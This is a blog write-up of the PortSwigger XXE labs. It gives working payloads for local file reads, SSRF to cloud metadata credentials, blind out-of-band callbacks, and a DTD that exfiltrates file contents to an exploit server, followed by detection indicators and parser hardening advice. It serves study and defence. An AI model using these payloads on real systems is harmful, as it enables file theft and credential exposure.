---
layout: post
title: "Entity Resolution Is a File and Network Boundary - An XXE Map"
date: 2026-06-11 09:30:00 +0800
categories: [web-security, methodology, detection-engineering]
tags: [xxe, xml, ssrf, oob, xinclude, portswigger]
related_posts:
  - 18-sqli-labs-from-tautologies-to-oob
  - web-cache-deception-five-labs
---

The nine PortSwigger XXE labs are a good reminder that XML parsing is not harmless string handling.

**Entity resolution is a file and network boundary.** When an XML parser accepts attacker-controlled input and is allowed to resolve external resources, it may read local files, call internal HTTP services, fetch remote DTDs, or leak data through parser errors and outbound callbacks.

The payload syntax is compact. The important question is larger: what can the parser resolve, and what feedback channel does the application expose?

## The capability matrix

The labs cover almost the full XXE decision tree:

| Lab group | Parser capability | Feedback channel | Technique |
|-----------|-------------------|------------------|-----------|
| file read | local file access | HTTP error text | general external entity |
| SSRF | outbound HTTP | HTTP error text | entity points at metadata service |
| blind interaction | outbound DNS/HTTP | OAST | general entity callback |
| parameter entity | DTD expansion | OAST | `%xxe;` inside the DTD |
| external DTD exfiltration | remote DTD + file read + outbound request | OAST or exploit-server log | two-stage parameter entities |
| error-message retrieval | file read + parser exception | HTTP error text | file contents inside invalid path |
| XInclude | include processing | HTTP error text | `xi:include parse="text"` |
| SVG upload | XML-backed image processing | rendered PNG | Batik expands entity during conversion |
| local DTD repurposing | local DTD import | parser exception | redefine an existing parameter entity |

That table is the article. XXE exploitation is less about memorizing one payload than selecting the right channel for the parser behavior in front of you.

## Start with the channel

A practical XXE decision tree:

```text
Visible response?       -> general entity or XInclude
No visible response?    -> OOB interaction
Need data over OOB?     -> external DTD with two-stage parameter entities
No OOB receiver?        -> force an error that includes the file contents
No remote DTD allowed?  -> repurpose a local DTD
Not an XML endpoint?    -> look for XML-backed formats such as SVG
```

The first two labs have an unusually generous channel. The application tries to parse `productId` as a number and returns an error when it is not numeric. That turns the error path into a reflection point.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

The server responds with something like:

```text
Invalid product ID: root:x:0:0:root:/root:/bin/bash...
```

The HTTP status is not the point. A `400` can still be a data channel.

## SSRF is the same primitive with a different scheme

Once external entity resolution can reach `file://`, the next question is whether it can reach `http://`. The metadata lab uses the same XML shape:

```xml
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
```

The entity target walks a simulated EC2 metadata tree and returns credential JSON. This is why XXE belongs in SSRF reviews. The vulnerable component is not the business endpoint; it is the parser's ability to make server-side requests while processing attacker-provided XML.

Detection should include application-originated requests to:

- cloud metadata addresses such as `169.254.169.254`;
- loopback or RFC1918 addresses from XML-processing services;
- unexpected external OAST domains;
- remote DTD hosts.

## Blind XXE: prove the parser can talk out

When the application does not reflect the entity value, the first proof is an outbound interaction:

```xml
<!DOCTYPE stockCheck [
  <!ENTITY xxe SYSTEM "http://<oast-domain>">
]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

Some environments block arbitrary outbound domains. In the PortSwigger Academy labs, Collaborator/OAST domains are the reliable path because the platform intentionally restricts third-party callbacks.

If regular external entities are blocked, parameter entities may still be accepted:

```xml
<!DOCTYPE stockCheck [
  <!ENTITY % xxe SYSTEM "http://<oast-domain>">
  %xxe;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

The distinction matters:

| Entity type | Expansion location | Reference form | Typical use |
|-------------|--------------------|----------------|-------------|
| general entity | document content | `&xxe;` | place file content into an element |
| parameter entity | DTD | `%xxe;` | import DTDs and build second-stage payloads |

Parameter entities are the bridge into the more interesting blind XXE chains.

## External DTD exfiltration

To extract file contents from a blind parser, the external DTD pattern creates a second-stage entity. One entity reads the file. Another dynamically defines an outbound request that includes the file value.

```dtd
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-server/exfil?x=%file;'>">
%eval;
%exfil;
```

The request imports that DTD:

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://exploit-server/exploit">
  %xxe;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

The official workflow uses an OAST server for the callback. In my run, the Academy exploit server was enough: it hosted the DTD and its access log recorded `/exfil?x=<hostname>`.

That operational detail matters during testing. If the exploit server is available, use it as the shortest evidence path before introducing another OOB tool.

## Error messages can be data channels

If outbound collection is unavailable but parser errors are exposed, the same two-stage DTD can move the file contents into a deliberately invalid path:

```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```

The parser tries to open a path that now contains the file content, then throws an exception:

```text
java.io.FileNotFoundException: /invalid/root:x:0:0:root:/root:/bin/bash...
```

This is not a separate vulnerability from XXE. It is an error-handling multiplier. The parser did the file read; the application made the result visible by returning the raw exception.

## XInclude: when you do not control the whole document

Sometimes the user controls only a field that the server later embeds inside an XML document. In that situation, a top-level `DOCTYPE` is not available.

XInclude is the alternate path:

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

`parse="text"` is essential because `/etc/passwd` is not valid XML. Without it, the parser attempts to parse the included file as XML and fails.

This is the general review lesson: "the endpoint is form-urlencoded" does not prove XML is absent. If the backend wraps user input into XML and enables include processing, the XML attack surface is still there.

## SVG is XML

The upload lab is a useful reminder for file-processing pipelines. The application accepts avatar uploads and uses Apache Batik to process SVG images. SVG is XML, so entity expansion can happen during image conversion:

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<svg width="320px" height="80px" xmlns="http://www.w3.org/2000/svg" version="1.1">
  <rect width="320" height="80" fill="white"/>
  <text font-size="24" x="4" y="40" fill="black">&xxe;</text>
</svg>
```

The proof is not in the HTML response. It is in the processed PNG. The entity expands into text, Batik renders it, and the hostname becomes visible as pixels.

That pattern applies beyond SVG:

- Office documents are zipped XML;
- SAML assertions are XML;
- SOAP is XML;
- many reporting and import features parse XML behind a non-XML UI;
- converters often run with broader filesystem and network access than the web tier should have.

## Local DTD repurposing

The expert lab removes the remote-DTD assumption. The hint points to a GNOME Yelp DocBook DTD:

```text
file:///usr/share/yelp/dtd/docbookx.dtd
```

The payload imports that local DTD and redefines a parameter entity that the DTD uses:

```xml
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

The encoding layers are easy to get wrong. `&#x25;` becomes `%`, `&#x26;#x25;` produces a second-stage percent sign, and `&#x27;` becomes a quote. The technique works because the local DTD supplies a parse path where the redefined entity is evaluated.

The broader lesson is important for hardened networks: blocking outbound DTD fetches is good, but it is not a complete fix if local DTDs remain importable and parameter entities remain enabled.

## Detection engineering notes

I would split XXE detection into four surfaces.

### 1. Raw XML indicators

Look for these in request bodies and uploaded text-like files:

```text
<!DOCTYPE
<!ENTITY
SYSTEM
PUBLIC
file://
%xxe;
xi:include
```

Raw signatures are noisy, but they are valuable on endpoints that should never receive DTDs.

### 2. Decoded parser behavior

Log when XML parsers resolve external resources. The best signal is not the raw body; it is the parser attempting file or network access:

- reads from `/etc/passwd`, `/etc/hostname`, `/proc/*`;
- outbound HTTP from XML-processing workers;
- DNS lookups to OAST-like domains;
- requests to cloud metadata services.

### 3. Error telemetry

Parser exceptions in HTTP responses are high-signal:

```text
SAXParseException
FileNotFoundException
DOCTYPE is disallowed
External Entity
EntityResolver
XInclude
```

Treat a parser error that includes a local path as an incident, not just a bad request.

### 4. File-processing pipelines

SVG and document conversion workers deserve their own monitoring:

- unexpected network egress from image converters;
- converter processes reading sensitive host files;
- uploaded SVGs with DTDs or external URLs;
- conversion errors containing XML parser stack traces.

## Hardening checklist

The root fix is to disable the dangerous parser features, not to filter payload strings.

For Java-style parsers, the shape is:

```text
disallow-doctype-decl = true
external-general-entities = false
external-parameter-entities = false
load-external-dtd = false
XIncludeAware = false unless explicitly needed
ExpandEntityReferences = false
```

The exact API varies by library, but the policy is consistent:

1. Disable DTDs unless the business case truly requires them.
2. Disable external general entities.
3. Disable external parameter entities.
4. Disable external DTD loading.
5. Disable XInclude unless required.
6. Give parsers no network access by default.
7. Run converters with low filesystem privileges.
8. Do not return raw parser exceptions to users.
9. Treat SVG, SAML, SOAP, Office XML, and import/export features as XML parser surfaces.

## Closing thought

XXE is often described as a payload family, but that framing is too small. The real issue is capability exposure.

An XML parser is allowed to resolve names into resources. If those resources include local files and internal network services, then the parser has crossed a trust boundary. The labs are useful because they show every feedback channel that can make that boundary visible: response text, OAST, errors, XInclude, rendered images, and local DTDs.

The safest parser is the one that treats untrusted XML as data, not as a request to go read the world around it.
